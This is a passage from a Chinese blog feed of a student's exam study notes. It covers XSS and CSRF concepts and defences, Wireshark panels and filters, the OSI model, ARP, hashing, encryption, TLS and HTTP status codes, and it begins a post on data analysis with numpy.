导致恶意用户能够在网页中注入恶意的脚本代码 这些恶意脚本在被其他用户访问时会在其浏览器中执行 从而达到攻击的目的<br>CSRF：应用程序没有对用户的请求进行有效的验证和授权，攻击者可以伪装用户身份向应用程序发送恶意请求，利用用户在应用程序中的登录状态或会话。</p><h3 id="攻击类型-方式："><a href="#攻击类型-方式：" class="headerlink" title="攻击类型/方式："></a><strong>攻击类型/方式：</strong></h3><p>XSS漏洞</p><ol><li><strong>存储型 XSS</strong>：攻击者将恶意脚本存储到服务器上的数据库或文件中，当其他用户访问包含恶意脚本的页面时，恶意脚本被从服务器检索并执行。</li><li><strong>反射型 XSS</strong>：攻击者将恶意脚本作为参数包含在URL中，当用户点击包含恶意参数的链接时，恶意脚本会从URL中反射到用户的浏览器中执行。</li></ol><p>CSRF漏洞</p><ol><li><strong>基于表单的CSRF</strong>：攻击者诱使用户在已经登录的情况下访问包含恶意表单的页面，当用户提交表单时，实际上是提交了恶意请求。</li><li><strong>基于图片的CSRF</strong>：攻击者将恶意请求隐藏在图片URL中，当用户加载包含恶意图片的页面时，实际上是触发了恶意请求。</li><li><strong>基于链接的CSRF</strong>：攻击者诱使用户点击包含恶意请求的链接，以触发恶意操作。</li></ol><p><strong>防御方式</strong><br>XSS：输入验证/转义 使用安全的http标头<br>CSRF：验证用户来源 生成随机验证token</p><h1 id="三、网络相关"><a href="#三、网络相关" class="headerlink" title="三、网络相关"></a>三、网络相关</h1><p><strong>Wireshark是一款用于监听网络的软件</strong></p><ul><li><p>wireshark有三个面板：</p><ul><li>packet list面板</li><li>packet details面板</li><li>packet bytes面板</li></ul><p><img data-src="/2024/05/05/%E5%8D%8F%E8%AE%AE-%E6%BC%8F%E6%B4%9E-%E7%BD%91%E7%BB%9C/12.png" alt="12"></p><p>这三个面板之间是相互关联的：</p><p>如果希望在packet details面板中查看一个单独的数据包的具体内容，必须在packet list面板中单机选中那个数据包<br>选中该数据包之后，才可以通过在packet deatils面板中选择数据宝的某个字段进行分析，从而在packet bytes面板中查看相应字段的字节信息</p><h2 id="packet-list"><a href="#packet-list" class="headerlink" title="packet list"></a>packet list</h2><p>packet list面板：以表格的形式显示了当前捕获文件中的所有数据报，从下面可以看出，一共有7列：</p><p>No（Number列）：包的编号<br>    默认wireshark是按照数据包编号从低到高排序<br>    该编号不会发生改变，即使使用了过滤也同样如此<br>Time列：包的时间戳。时间格式可以自己设置<br>Source列和Destination列：包的源地址和目的地址<br>Protocol列：包的协议类型<br>Length列：包的长度<br>Info列：包的附加信息</p><p><img data-src="/2024/05/05/%E5%8D%8F%E8%AE%AE-%E6%BC%8F%E6%B4%9E-%E7%BD%91%E7%BB%9C/13.png" alt="13"></p><h2 id="packet-details"><a href="#packet-details" class="headerlink" title="packet details"></a>packet details</h2><p>packet details面板：分层的显示了一个数据包中的内容，并且可以通过展开或者收缩来显示这个数据包中所捕获的全部内容<br><img data-src="/2024/05/05/%E5%8D%8F%E8%AE%AE-%E6%BC%8F%E6%B4%9E-%E7%BD%91%E7%BB%9C/14.png" alt="14"><br>默认数据详细信息都是合并的，如果要查看，可以单击每行前面的箭头：<br><img data-src="/2024/05/05/%E5%8D%8F%E8%AE%AE-%E6%BC%8F%E6%B4%9E-%E7%BD%91%E7%BB%9C/15.png" alt="15"></p><h2 id="packet-bytes"><a href="#packet-bytes" class="headerlink" title="packet bytes"></a>packet bytes</h2><p>packet bytes面板：</p><ul><li>显示了一个数据包未经处理的原始样子，也就是它在链路上传播时的样子。</li><li>在该面板中的数据是以16进制和ASCII格式显示了帧的内容</li><li>当在packet details面板中选择任意一个字段后，在packet bytes面板中包含该字段的字节也高亮显示。</li></ul><p><img data-src="/2024/05/05/%E5%8D%8F%E8%AE%AE-%E6%BC%8F%E6%B4%9E-%E7%BD%91%E7%BB%9C/16.png" alt="16"></p></li></ul><h3 id="1-协议过滤器"><a href="#1-协议过滤器" class="headerlink" title="1. 协议过滤器"></a>1. 协议过滤器</h3><ul><li><strong>过滤特定协议</strong>：<ul><li><code>http</code>：显示所有HTTP协议的数据包。</li><li><code>tcp</code>：显示所有TCP协议的数据包。</li><li><code>udp</code>：显示所有UDP协议的数据包。</li><li><code>icmp</code>：显示所有ICMP协议的数据包。</li></ul></li></ul><h3 id="2-IP地址和端口过滤器"><a href="#2-IP地址和端口过滤器" class="headerlink" title="2. IP地址和端口过滤器"></a>2. IP地址和端口过滤器</h3><ul><li><strong>过滤源或目标IP地址</strong>：<ul><li><code>ip.addr == 192.168.1.100</code>：显示源或目标IP地址为192.168.1.100的数据包。</li></ul></li><li><strong>过滤源或目标端口</strong>：<ul><li><code>tcp.port == 80</code>：显示目标或源端口为80的TCP数据包。</li><li><code>udp.port == 53</code>：显示目标或源端口为53的UDP数据包。</li></ul></li></ul><h3 id="3-数据包方向和流量类型过滤器"><a href="#3-数据包方向和流量类型过滤器" class="headerlink" title="3. 数据包方向和流量类型过滤器"></a>3. 数据包方向和流量类型过滤器</h3><ul><li><strong>过滤数据包方向</strong>：<ul><li><code>src host 192.168.1.100</code>：显示源IP地址为192.168.1.100的数据包。</li><li><code>dst host 192.168.1.100</code>：显示目标IP地址为192.168.1.100的数据包。</li><li><code>src net 192.168.1.0/24</code>：显示源IP地址属于192.168.1.0/24子网的数据包。</li></ul></li><li><strong>过滤流量类型</strong>：<ul><li><code>tcp.flags.syn == 1</code>：显示带有TCP SYN标志的数据包（用于TCP连接建立）。</li><li><code>tcp.flags.ack == 1</code>：显示带有TCP ACK标志的数据包（用于确认）。</li></ul></li></ul><h3 id="4-组合过滤器"><a href="#4-组合过滤器" class="headerlink" title="4. 组合过滤器"></a>4. 组合过滤器</h3><ul><li><strong>组合多个条件</strong>：<ul><li><code>ip.addr == 192.168.1.100 &amp;&amp; tcp.port == 80</code>：显示源或目标IP地址为192.168.1.100且目标或源端口为80的数据包。</li><li><code>tcp.flags.syn == 1 &amp;&amp; ip.addr == 192.168.1.100</code>：显示源或目标IP地址为192.168.1.100且带有TCP SYN标志的数据包。</li></ul></li></ul><h3 id="5-其他过滤器"><a href="#5-其他过滤器" class="headerlink" title="5. 其他过滤器"></a>5. 其他过滤器</h3><ul><li><strong>过滤特定协议的字段</strong>：<ul><li><code>http.request.method == "GET"</code>：显示所有HTTP GET请求的数据包。</li><li><code>http.response.code == 200</code>：显示所有HTTP响应码为200的数据包。</li></ul></li></ul></body></html>]]></content>
    
    
    <summary type="html">&lt;p&gt;从头到尾再来一遍的感觉吧&lt;/p&gt;</summary>
    
    
    
    <category term="学习" scheme="https://www.maonie.top/categories/%E5%AD%A6%E4%B9%A0/"/>
    
    
    <category term="学习" scheme="https://www.maonie.top/tags/%E5%AD%A6%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>最新的知识点</title>
    <link href="https://www.maonie.top/2024/04/28/%E6%9C%80%E6%96%B0%E7%9A%84%E7%9F%A5%E8%AF%86%E7%82%B9/"/>
    <id>https://www.maonie.top/2024/04/28/%E6%9C%80%E6%96%B0%E7%9A%84%E7%9F%A5%E8%AF%86%E7%82%B9/</id>
    <published>2024-04-28T02:48:04.000Z</published>
    <updated>2024-05-06T04:55:03.174Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><html><head></head><body><p>考试可能会用到 谁又知道呢</p><h1 id="一、osi模型"><a href="#一、osi模型" class="headerlink" title="一、osi模型"></a>一、osi模型</h1><p>维基百科定义：</p><blockquote><p> “OSI模型，即开放式通信系统互联参考模型（Open System Interconnection Reference Model），是国际标准化组织（ISO）提出的一个试图使各种计算机在世界范围内互连为网络的标准框架，简称OSI。”</p></blockquote><p>定义了网络互连的七层模型（物理层、数据链路层、网络层、传输层、会话层、表示层、应用层）</p><span id="more"></span><h2 id="这七层分别有什么用-对应什么协议"><a href="#这七层分别有什么用-对应什么协议" class="headerlink" title="这七层分别有什么用/对应什么协议"></a><strong>这七层分别有什么用/对应什么协议</strong></h2><p>应用层：为应用程序或用户请求提供各种请求服务。OSI参考模型最高层，也是最靠近用户的一层，为计算机用户、各种应用程序以及网络提供接口，也为用户直接提供各种网络服务。</p><p>表示层：数据编码、格式转换、数据加密。提供各种用于应用层数据的编码和转换功能,确保一个系统的应用层发送的数据能被另一个系统的应用层识别。如果必要，该层可提供一种标准表示形式，用于将计算机内部的多种数据格式转换成通信中采用的标准表示形式。数据压缩和加密也是表示层可提供的转换功能之一。</p><p>会话层：创建、管理和维护会话。接收来自传输层的数据，负责建立、管理和终止表示层实体之间的通信会话，支持它们之间的数据交换。该层的通信由不同设备中的应用程序之间的服务请求和响应组成。</p><p>传输层：数据通信。建立主机端到端的链接，为会话层和网络层提供端到端可靠的和透明的数据传输服务，确保数据能完整的传输到网络层。</p><p>网络层：IP选址及路由选择。通过路由选择算法，为报文或通信子网选择最适当的路径。控制数据链路层与传输层之间的信息转发，建立、维持和终止网络的连接。数据链路层的数据在这一层被转换为数据包，然后通过路径选择、分段组合、顺序、进/出路由等控制，将信息从一个网络设备传送到另一个网络设备。</p><p>数据链路层：提供介质访问和链路管理。接收来自物理层的位流形式的数据，封装成帧，传送到网络层；将网络层的数据帧，拆装为位流形式的数据转发到物理层；负责建立和管理节点间的链路，通过各种控制协议，将有差错的物理信道变为无差错的、能可靠传输数据帧的数据链路。</p><p>物理层：管理通信设备和网络媒体之间的互联互通。传输介质为数据链路层提供物理连接，实现比特流的透明传输。实现相邻计算机节点之间比特流的透明传送，屏蔽具体传输介质和物理设备的差异。</p><p><img data-src="/blob.jpg" alt="blob"></p><h1 id="二、wireshark（主要是面板和筛选器）"><a href="#二、wireshark（主要是面板和筛选器）" class="headerlink" title="二、wireshark（主要是面板和筛选器）"></a>二、wireshark（主要是面板和筛选器）</h1><h2 id="首先讲面板"><a href="#首先讲面板" class="headerlink" title="首先讲面板"></a>首先讲面板</h2><p>wireshark有三个面板：</p><ul><li>packet list面板</li><li>packet details面板</li><li>packet bytes面板</li></ul><p><img data-src="/2024/04/28/%E6%9C%80%E6%96%B0%E7%9A%84%E7%9F%A5%E8%AF%86%E7%82%B9/12.png" alt="12"></p><p>这三个面板之间是相互关联的：</p><p>如果希望在packet details面板中查看一个单独的数据包的具体内容，必须在packet list面板中单机选中那个数据包<br>选中该数据包之后，才可以通过在packet deatils面板中选择数据宝的某个字段进行分析，从而在packet bytes面板中查看相应字段的字节信息</p><h2 id="packet-list"><a href="#packet-list" class="headerlink" title="packet list"></a>packet list</h2><p>packet list面板：以表格的形式显示了当前捕获文件中的所有数据报，从下面可以看出，一共有7列：</p><p>No（Number列）：包的编号<br>    默认wireshark是按照数据包编号从低到高排序<br>    该编号不会发生改变，即使使用了过滤也同样如此<br>Time列：包的时间戳。时间格式可以自己设置<br>Source列和Destination列：包的源地址和目的地址<br>Protocol列：包的协议类型<br>Length列：包的长度<br>Info列：包的附加信息</p><p><img data-src="/2024/04/28/%E6%9C%80%E6%96%B0%E7%9A%84%E7%9F%A5%E8%AF%86%E7%82%B9/13.png" alt="13"></p><h2 id="packet-details"><a href="#packet-details" class="headerlink" title="packet details"></a>packet details</h2><p>packet details面板：分层的显示了一个数据包中的内容，并且可以通过展开或者收缩来显示这个数据包中所捕获的全部内容<br><img data-src="/2024/04/28/%E6%9C%80%E6%96%B0%E7%9A%84%E7%9F%A5%E8%AF%86%E7%82%B9/14.png" alt="14"><br>默认数据详细信息都是合并的，如果要查看，可以单击每行前面的箭头：<br><img data-src="/2024/04/28/%E6%9C%80%E6%96%B0%E7%9A%84%E7%9F%A5%E8%AF%86%E7%82%B9/15.png" alt="15"></p><h2 id="packet-bytes"><a href="#packet-bytes" class="headerlink" title="packet bytes"></a>packet bytes</h2><p>packet bytes面板：</p><ul><li>显示了一个数据包未经处理的原始样子，也就是它在链路上传播时的样子。</li><li>在该面板中的数据是以16进制和ASCII格式显示了帧的内容</li><li>当在packet details面板中选择任意一个字段后，在packet bytes面板中包含该字段的字节也高亮显示。</li></ul><p><img data-src="/2024/04/28/%E6%9C%80%E6%96%B0%E7%9A%84%E7%9F%A5%E8%AF%86%E7%82%B9/16.png" alt="16"></p><h1 id="三、ARP协议"><a href="#三、ARP协议" class="headerlink" title="三、ARP协议"></a>三、ARP协议</h1><h3 id="什么是ARP"><a href="#什么是ARP" class="headerlink" title="什么是ARP"></a><strong>什么是ARP</strong></h3><p>地址解析协议，即ARP（Address Resolution Protocol），是根据IP地址获取物理地址的一个TCP/IP协议。主机发送信息时将包含目标IP地址的ARP请求广播到局域网络上的所有主机，并接收返回消息，以此确定目标的物理地址；收到返回消息后将该IP地址和物理地址存入本机ARP缓存中并保留一定时间，下次请求时直接查询ARP缓存以节约资源。地址解析协议是建立在网络中各个主机互相信任的基础上的，局域网络上的主机可以自主发送ARP应答消息，其他主机收到应答报文时不会检测该报文的真实性就会将其记入本机ARP缓存；</p><p>最直白的说法是：在IP以太网中，当一个上层协议要发包时，有了该节点的IP地址，ARP就能提供该节点的MAC地址。</p><p>大家都知道，OSI模式把网络工作分为七层，彼此不直接打交道，只通过接口(layre interface). IP地址在第三层（网络层）, MAC地址在第二层（数据链路层）。协议在发送数据包时，首先要封装第三层（IP地址）和第二层 （MAC地址）的报头, 但协议只知道目的节点的IP地址，不知道其物理地址，又不能跨第二、三层，所以得用ARP的服务拿到MAC地址。</p><h1 id="四、哈希函数"><a href="#四、哈希函数" class="headerlink" title="四、哈希函数"></a>四、哈希函数</h1><p>哈希函数（Hash Function）是一种将任意长度的数据映射到固定长度输出的算法。哈希函数常用于加密、数字签名、数据完整性验证、数据压缩等领域。</p><p>哈希函数具有以下几个特点：</p><ol><li><strong>固定输出长度</strong>：哈希函数的输出长度固定，不论输入数据的长度如何，输出长度都是固定的。</li><li><strong>单向性</strong>：哈希函数是一种单向函数，即无法从哈希值推算出原始数据。<em>这是哈希函数应用于密码学的一个关键特性。</em></li><li><strong>确定性</strong>：对于相同的输入数据，哈希函数总是会生成相同的输出值。</li><li><strong>雪崩效应</strong>：哈希函数的输入数据只要发生了微小的变化，输出值就会发生巨大的变化，这种效应被称为雪崩效应。</li></ol><p>哈希函数广泛应用于密码学中，通常用于保护数据的机密性和完整性。例如，常用的密码存储方法是将用户密码经过哈希函数处理后存储在数据库中，当用户登录时，输入的密码会被哈希函数处理后与数据库中的哈希值进行比较，从而验证密码的正确性。</p><h1 id="五、对称-非对称数据加密"><a href="#五、对称-非对称数据加密" class="headerlink" title="五、对称/非对称数据加密"></a>五、对称/非对称数据加密</h1><h2 id="对称加密"><a href="#对称加密" class="headerlink" title="对称加密"></a>对称加密</h2><p>概念：加密算法是公开的，靠的是秘钥来加密数据，使用一个秘钥加密，必须使用相同的秘钥才解密。<br>优点： 算法公开、计算量小、加密速度快、加密效率高<br>缺点：在数据传送前，发送方和接收方必须商定好秘钥，然后使双方都能保存好秘钥。</p><p>常见算法：DES、3DES、Blowfish、IDEA、RC4、RC5、RC6 和 AES</p><h2 id="非对称加密"><a href="#非对称加密" class="headerlink" title="非对称加密"></a>非对称加密</h2><p>概念：加密和解密使用不同的秘钥，一把公开的公钥，一把私有的私钥。公钥加密的信息只有私钥才能解密，私钥加密的信息只有公钥才能解密。<br>优点：安全，即使密文被拦截、公钥被获取，但是无法获取到私钥，也就无法破译密文。作为接收方，务必要保管好自己的密钥。<br>缺点：加密算法及其复杂，安全性依赖算法与密钥，而且加密和解密效率很低。</p><p>常见算法：RSA、DSA、ECC<br>工作流程：A生成一对非对称秘钥，将公钥向所有人公开，B拿到A的公钥后使用A的公钥对信息加密后发送给A，经过加密的信息只有A手中的私钥能解密。这样B可以通过这种方式将自己的公钥加密后发送给A，两方建立起通信，可以通过对方的公钥加密要发送的信息，接收方用私钥解密信息。</p><h1 id="六、SSL-TLS协议（443端口-传输层）"><a href="#六、SSL-TLS协议（443端口-传输层）" class="headerlink" title="六、SSL/TLS协议（443端口 传输层）"></a>六、SSL/TLS协议（443端口 传输层）</h1><p>SSL（安全套接字层）及其后继者TLS（传输层安全）是用于在联网计算机之间建立经过身份验证和加密的链接的协议。尽管SSL协议在 1999年已经随着TLS 1.0的发布而被弃用，但我们仍将这些相关技术称为“SSL”或“SSL/TLS”。那么SSL协议的定义是什么呢？本文将为你详细介绍，并解答关于SSL和TLS的一些常见问题。</p><p><strong>一、SSL协议是什么？</strong></p><p>SSL（Secure Sockets Layer）协议是一种用于保证网络通信安全的加密协议，最新的版本为TLS（Transport Layer Security）。SSL/TLS协议<strong>工作在传输层</strong>，用于加密数据的传输，可以保证数据在传输过程中不被窃取、篡改或者伪造，是现代互联网应用程序中最广泛使用的一种安全协议。</p><p><strong>二、什么是</strong> <strong>SSL 证书？</strong></p><p><a href="https://link.zhihu.com/?target=https://www.racent.com/ssl">SSL 证书</a>，也称为 TLS 或 SSL/TLS 证书，是将网站的身份绑定到由公钥和私钥组成的加密密钥对的数字文档。证书中包含的公钥允许 Web浏览器通过TLS和HTTPS协议启动与Web服务器的加密通信会话。私钥在服务器上保持安全，用于对网页和其他文档进行数字签名。</p><p><strong>三、什么是</strong> <strong>TLS？</strong></p><p>TLS（传输层安全）于1999年发布，是用于身份验证和加密的SSL（安全套接字层）协议的继承者。TLS 1.3 在RFC 8446（2018 年 8 月）中定义。</p><p><strong>四、建议在哪个端口上使用</strong> <strong>SSL/TLS？</strong></p><p>SSL/TLS可以使用任何端口，但是为了获得最大的兼容性，更推荐标准的端口443用于安全 SSL/TLS 通信。</p><p><strong>五、当前版本的</strong> <strong>SSL/TLS 是什么？</strong></p><p>当前版本的SSL/TLS包括：TLS 1.3由RFC 8446于2018年8月定义，是 SSL/TLS 的最新版本；TLS 1.2 (RFC 5246)于2008年8月定义，并且仍在广泛使用。TLS 1.2 之前的 SSL/TLS 版本被认为是不安全的，不应再使用。</p><h1 id="七、状态码"><a href="#七、状态码" class="headerlink" title="七、状态码"></a>七、状态码</h1><h1 id="HTTP-状态码"><a href="#HTTP-状态码" class="headerlink" title="HTTP 状态码"></a>HTTP 状态码</h1><p>当浏览者访问一个网页时，浏览者的浏览器会向网页所在服务器发出请求。当浏览器接收并显示网页前，此网页所在的服务器会返回一个包含 HTTP 状态码的信息头（server header）用以响应浏览器的请求。</p><p>HTTP 状态码的英文为 <strong>HTTP Status Code</strong>。</p><p>下面是常见的 HTTP 状态码：</p><ul><li><strong>1xx（信息性状态码）</strong>：表示接收的请求正在处理。</li><li><strong>2xx（成功状态码）</strong>：表示请求正常处理完毕。</li><li><strong>3xx（重定向状态码）</strong>：需要后续操作才能完成这一请求。</li><li><strong>4xx（客户端错误状态码）</strong>：表示请求包含语法错误或无法完成。</li><li><strong>5xx（服务器错误状态码）</strong>：服务器在处理请求的过程中发生了错误。</li></ul><h2 id="HTTP-状态码分类"><a href="#HTTP-状态码分类" class="headerlink" title="HTTP 状态码分类"></a>HTTP 状态码分类</h2><p>HTTP 状态码由三个十进制数字组成，第一个十进制数字定义了状态码的类型。响应分为五类：信息响应(100–199)，成功响应(200–299)，重定向(300–399)，客户端错误(400–499)和服务器错误 (500–599)：</p><table><thead><tr><th align="left">分类</th><th align="left">分类描述</th></tr></thead><tbody><tr><td align="left">1**</td><td align="left">信息，服务器收到请求，需要请求者继续执行操作</td></tr><tr><td align="left">2**</td><td align="left">成功，操作被成功接收并处理</td></tr><tr><td align="left">3**</td><td align="left">重定向，需要进一步的操作以完成请求</td></tr><tr><td align="left">4**</td><td align="left">客户端错误，请求包含语法错误或无法完成请求</td></tr><tr><td align="left">5**</td><td align="left">服务器错误，服务器在处理请求的过程中发生了错误</td></tr></tbody></table><p>HTTP状态码列表:</p><table><thead><tr><th align="left">状态码</th><th align="left">状态码英文名称</th><th align="center">中文描述</th></tr></thead><tbody><tr><td align="left">100</td><td align="left">Continue</td><td align="center">继续。客户端应继续其请求</td></tr><tr><td align="left">101</td><td align="left">Switching Protocols</td><td align="center">切换协议。服务器根据客户端的请求切换协议。只能切换到更高级的协议，例如，切换到HTTP的新版本协议</td></tr><tr><td align="left"></td><td align="left"></td><td align="center"></td></tr><tr><td align="left">200</td><td align="left">OK</td><td align="center">请求成功。一般用于GET与POST请求</td></tr><tr><td align="left">201</td><td align="left">Created</td><td align="center">已创建。成功请求并创建了新的资源</td></tr><tr><td align="left">202</td><td align="left">Accepted</td><td align="center">已接受。已经接受请求，但未处理完成</td></tr><tr><td align="left">203</td><td align="left">Non-Authoritative Information</td><td align="center">非授权信息。请求成功。但返回的meta信息不在原始的服务器，而是一个副本</td></tr><tr><td align="left">204</td><td align="left">No Content</td><td align="center">无内容。服务器成功处理，但未返回内容。在未更新网页的情况下，可确保浏览器继续显示当前文档</td></tr><tr><td align="left">205</td><td align="left">Reset Content</td><td align="center">重置内容。服务器处理成功，用户终端（例如：浏览器）应重置文档视图。可通过此返回码清除浏览器的表单域</td></tr><tr><td align="left">206</td><td align="left">Partial Content</td><td align="center">部分内容。服务器成功处理了部分GET请求</td></tr><tr><td align="left"></td><td align="left"></td><td align="center"></td></tr><tr><td align="left">300</td><td align="left">Multiple Choices</td><td align="center">多种选择。请求的资源可包括多个位置，相应可返回一个资源特征与地址的列表用于用户终端（例如：浏览器）选择</td></tr><tr><td align="left">301</td><td align="left">Moved Permanently</td><td align="center">永久移动。请求的资源已被永久的移动到新URI，返回信息会包括新的URI，浏览器会自动定向到新URI。今后任何新的请求都应使用新的URI代替</td></tr><tr><td align="left">302</td><td align="left">Found</td><td align="center">临时移动。与301类似。但资源只是临时被移动。客户端应继续使用原有URI</td></tr><tr><td align="left">303</td><td align="left">See Other</td><td align="center">查看其它地址。与301类似。使用GET和POST请求查看</td></tr><tr><td align="left">304</td><td align="left">Not Modified</td><td align="center">未修改。所请求的资源未修改，服务器返回此状态码时，不会返回任何资源。客户端通常会缓存访问过的资源，通过提供一个头信息指出客户端希望只返回在指定日期之后修改的资源</td></tr><tr><td align="left">305</td><td align="left">Use Proxy</td><td align="center">使用代理。所请求的资源必须通过代理访问</td></tr><tr><td align="left">306</td><td align="left">Unused</td><td align="center">已经被废弃的HTTP状态码</td></tr><tr><td align="left">307</td><td align="left">Temporary Redirect</td><td align="center">临时重定向。与302类似。使用GET请求重定向</td></tr><tr><td align="left"></td><td align="left"></td><td align="center"></td></tr><tr><td align="left">400</td><td align="left">Bad Request</td><td align="center">客户端请求的语法错误，服务器无法理解</td></tr><tr><td align="left">401</td><td align="left">Unauthorized</td><td align="center">请求要求用户的身份认证</td></tr><tr><td align="left">402</td><td align="left">Payment Required</td><td align="center">保留，将来使用</td></tr><tr><td align="left">403</td><td align="left">Forbidden</td><td align="center">服务器理解请求客户端的请求，但是拒绝执行此请求</td></tr><tr><td align="left">404</td><td align="left">Not Found</td><td align="center">服务器无法根据客户端的请求找到资源（网页）。通过此代码，网站设计人员可设置”您所请求的资源无法找到”的个性页面</td></tr><tr><td align="left">405</td><td align="left">Method Not Allowed</td><td align="center">客户端请求中的方法被禁止</td></tr><tr><td align="left">406</td><td align="left">Not Acceptable</td><td align="center">服务器无法根据客户端请求的内容特性完成请求</td></tr><tr><td align="left">407</td><td align="left">Proxy Authentication Required</td><td align="center">请求要求代理的身份认证，与401类似，但请求者应当使用代理进行授权</td></tr><tr><td align="left">408</td><td align="left">Request Time-out</td><td align="center">服务器等待客户端发送的请求时间过长，超时</td></tr><tr><td align="left">409</td><td align="left">Conflict</td><td align="center">服务器完成客户端的 PUT 请求时可能返回此代码，服务器处理请求时发生了冲突</td></tr><tr><td align="left">410</td><td align="left">Gone</td><td align="center">客户端请求的资源已经不存在。410不同于404，如果资源以前有现在被永久删除了可使用410代码，网站设计人员可通过301代码指定资源的新位置</td></tr><tr><td align="left">411</td><td align="left">Length Required</td><td align="center">服务器无法处理客户端发送的不带Content-Length的请求信息</td></tr><tr><td align="left">412</td><td align="left">Precondition Failed</td><td align="center">客户端请求信息的先决条件错误</td></tr><tr><td align="left">413</td><td align="left">Request Entity Too Large</td><td align="center">由于请求的实体过大，服务器无法处理，因此拒绝请求。为防止客户端的连续请求，服务器可能会关闭连接。如果只是服务器暂时无法处理，则会包含一个Retry-After的响应信息</td></tr><tr><td align="left">414</td><td align="left">Request-URI Too Large</td><td align="center">请求的URI过长（URI通常为网址），服务器无法处理</td></tr><tr><td align="left">415</td><td align="left">Unsupported Media Type</td><td align="center">服务器无法处理请求附带的媒体格式</td></tr><tr><td align="left">416</td><td align="left">Requested range not satisfiable</td><td align="center">客户端请求的范围无效</td></tr><tr><td align="left">417</td><td align="left">I’m a teapot</td><td align="center">服务器无法满足Expect的请求头信息</td></tr><tr><td align="left">418</td><td align="left">I’m a teapot</td><td align="center">状态码 418 实际上是一个愚人节玩笑。它在 RFC 2324 中定义，该 RFC 是一个关于超文本咖啡壶控制协议（HTCPCP）的笑话文件。在这个笑话中，418 状态码是作为一个玩笑加入到 HTTP 协议中的。</td></tr><tr><td align="left"></td><td align="left"></td><td align="center"></td></tr><tr><td align="left">500</td><td align="left">Internal Server Error</td><td align="center">服务器内部错误，无法完成请求</td></tr><tr><td align="left">501</td><td align="left">Not Implemented</td><td align="center">服务器不支持请求的功能，无法完成请求</td></tr><tr><td align="left">502</td><td align="left">Bad Gateway</td><td align="center">作为网关或者代理工作的服务器尝试执行请求时，从远程服务器接收到了一个无效的响应</td></tr><tr><td align="left">503</td><td align="left">Service Unavailable</td><td align="center">由于超载或系统维护，服务器暂时的无法处理客户端的请求。延时的长度可包含在服务器的Retry-After头信息中</td></tr><tr><td align="left">504</td><td align="left">Gateway Time-out</td><td align="center">充当网关或代理的服务器，未及时从远端服务器获取请求</td></tr><tr><td align="left">505</td><td align="left">HTTP Version not supported</td><td align="center">服务器不支持请求的HTTP协议的版本，无法完成处理</td></tr></tbody></table></body></html>]]></content>
    
    
    <summary type="html">&lt;p&gt;考试可能会用到 谁又知道呢&lt;/p&gt;
&lt;h1 id=&quot;一、osi模型&quot;&gt;&lt;a href=&quot;#一、osi模型&quot; class=&quot;headerlink&quot; title=&quot;一、osi模型&quot;&gt;&lt;/a&gt;一、osi模型&lt;/h1&gt;&lt;p&gt;维基百科定义：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt; “OSI模型，即开放式通信系统互联参考模型（Open System Interconnection Reference Model），是国际标准化组织（ISO）提出的一个试图使各种计算机在世界范围内互连为网络的标准框架，简称OSI。”&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;定义了网络互连的七层模型（物理层、数据链路层、网络层、传输层、会话层、表示层、应用层）&lt;/p&gt;</summary>
    
    
    
    <category term="学习" scheme="https://www.maonie.top/categories/%E5%AD%A6%E4%B9%A0/"/>
    
    
    <category term="学习" scheme="https://www.maonie.top/tags/%E5%AD%A6%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>数据分析相关</title>
    <link href="https://www.maonie.top/2024/04/27/%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90%E7%9B%B8%E5%85%B3/"/>
    <id>https://www.maonie.top/2024/04/27/%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90%E7%9B%B8%E5%85%B3/</id>
    <published>2024-04-27T11:36:28.000Z</published>
    <updated>2024-04-27T12:37:30.974Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><html><head></head><body><h2 id="数据分析是干啥的"><a href="#数据分析是干啥的" class="headerlink" title="数据分析是干啥的"></a>数据分析是干啥的</h2><p>-整合一堆杂乱无章的数据 把背后的信息提炼出来 使数据的价值最大化<br>–分析用户的消费行为 指定相应的方案 调整促销时间 力度 计算用户活跃度和产品的回购力度<br>–分析广告的点击率 决定广告的投放时间 制定广告方案 决定投放等等</p><p>例：<br>1.保险公司从大量的赔付申请数据中判断哪些存在骗保可能<br>2.支付宝通过用户消费记录和行为自动调整花呗额度<br>3.短视频通过用户的点击和观看行为给用户推送合适的视频</p><h2 id="我为啥要学数据分析"><a href="#我为啥要学数据分析" class="headerlink" title="我为啥要学数据分析"></a>我为啥要学数据分析</h2><p><del>因为我现在就得用</del><br>可以用于某些岗位或竞赛<br>python数据科学的基础<br>机器学习课程的基础</p><h2 id="数据分析的流程"><a href="#数据分析的流程" class="headerlink" title="数据分析的流程"></a>数据分析的流程</h2><span id="more"></span><p>提出问题<br>准备数据<br>分析数据<br>获得结论<br>成果可视化</p><h2 id="要用的工具"><a href="#要用的工具" class="headerlink" title="要用的工具"></a>要用的工具</h2><p>-numpy<br>-pandas<br>-matplotlib</p><h2 id="开发环境"><a href="#开发环境" class="headerlink" title="开发环境"></a>开发环境</h2><p>-anaconda|全球最受欢迎的数据啥啥啥|集成了数据分析和机器学习需要的全部环境<br>注意：安装目录不能有中文和特殊符号<br>-jupyter|anaconda提供的基于浏览器的<strong>可视化开发工具</strong><br>启动方式：cmd-jupyter notebook-回车<br>新建方式：图形化页面-new-文件或者文件夹<br>            python3：anaconda中的源文件<br>            cell:可以在里面执行相关代码 code模式是代码 markdown模式是笔记<br>            可以在编辑页面更换<br>快捷键：添加cell-a或者b<br>        删除-x<br>        修改cell的模式-m：修改成markdown<br>                         y：修改成code模式<br>        执行cell-shift+enter<br>        tab：自动补全<br>        代开帮助文档：shift+tab</p><h2 id="numpy模块的使用"><a href="#numpy模块的使用" class="headerlink" title="numpy模块的使用"></a>numpy模块的使用</h2><p>创建numpy</p><h3 id="1-1创建一个一维数组"><a href="#1-1创建一个一维数组" class="headerlink" title="1.1创建一个一维数组"></a><strong>1.1创建一个一维数组</strong></h3><pre 